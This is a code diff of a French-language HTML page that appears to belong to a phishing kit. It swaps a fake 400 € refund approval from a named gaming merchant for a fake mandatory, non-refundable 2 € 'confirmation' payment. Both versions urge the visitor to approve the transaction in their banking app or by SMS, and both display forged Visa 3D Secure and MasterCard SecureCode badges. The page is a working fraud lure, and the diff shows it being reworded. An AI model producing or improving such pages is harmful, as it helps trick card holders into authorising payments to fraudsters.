@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validation de Remboursement</title>
+    <title>Validation du Paiement</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -73,36 +73,36 @@
     <div class="container">
         <!-- Logos sécurisés -->
         <div class="secure-icons">
-            <img src="IMG_4262.jpeg" alt="Remboursement Sécurisé">
+            <img src="logo-paiement-securise (1).png" alt="Paiement Sécurisé">
         </div>
 
         <!-- Boîte orange -->
         <div class="orange-box">
-            <h2>Remboursement en attente de validation</h2>
+            <h2>Validation en attente</h2>
             <p>
-                Merci de vous connecter sur votre application bancaire afin d'approuver la demande de remboursement et créditer le montant sur votre carte.<br>
-                Valider par SMS si vous ne possédez pas l'application bancaire !<br>
-                <a href="confirmation_finale.html">Cliquez ici</a>
+                Merci de vous connecter sur votre application bancaire afin de confirmer le paiement de 2 € pour finaliser votre demande. Ce paiement est obligatoire pour la validation et n'est pas remboursable.<br>
+                Si vous ne possédez pas l'application bancaire, validez par SMS.<br>
+                <a href="confirmation_finale.html">Cliquez ici</a> pour continuer.
             </p>
         </div>
 
-        <!-- Informations du remboursement -->
+        <!-- Informations du paiement -->
         <div class="info">
-            <p><strong>Marchand :</strong> Widilo - Instant Gaming</p>
-            <p><strong>Montant de remboursement :</strong> 400 €</p>
+            <p><strong>Marchand :</strong> Service de Confirmation</p>
+            <p><strong>Montant du paiement :</strong> 2 €</p>
             <p><strong>Date :</strong> <span id="current-date"></span></p>
-            <p><strong>N° de carte :</strong> **** **** **** <span id="last-four">0000</span></p>
+            <p><strong>N° de carte :</strong> **** **** **** <span id="last-four">****</span></p>
             <p><strong>Numéro de téléphone :</strong> <span id="phone-number">Non renseigné</span></p>
         </div>
 
         <!-- Icônes de sécurité -->
         <div class="footer-icons">
-            <img src="IMG_4261.jpeg" alt="Verified by Visa, 3D Secure, MasterCard SecureCode">
+            <img src="img-app.png" alt="Verified by Visa, 3D Secure, MasterCard SecureCode">
         </div>
     </div>
 
     <script>
-        // الحصول على التاريخ الحالي فقط
+        // Obtenir la date actuelle
         const currentDate = new Date();
         const formattedDate = currentDate.toLocaleDateString('fr-FR', {
             year: 'numeric',
